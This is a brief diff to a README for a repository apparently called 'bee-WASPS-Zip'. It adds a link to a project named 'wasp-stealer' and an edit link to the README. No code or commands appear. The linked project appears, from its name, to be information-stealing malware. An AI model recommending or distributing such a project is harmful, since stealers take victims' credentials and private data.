@@ -2,3 +2,7 @@
 <h1>bee-WASPS-Zip</h1>
 
 <img width="250px" src="https://camo.githubusercontent.com/f7717932d4bd963c70e91af4ce2ca3a9177cc6f1eb5948c69956fd1b9b54d550/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3936333131343334393837373136323030342f3939323234353735313234373830363531352f756e6b6e6f776e2e706e67">
+
+https://github.com/heygdrg/wasp-stealer#features
+
+https://github.com/ghostn4444/Bee-WASPS-Zip/edit/main/README.md
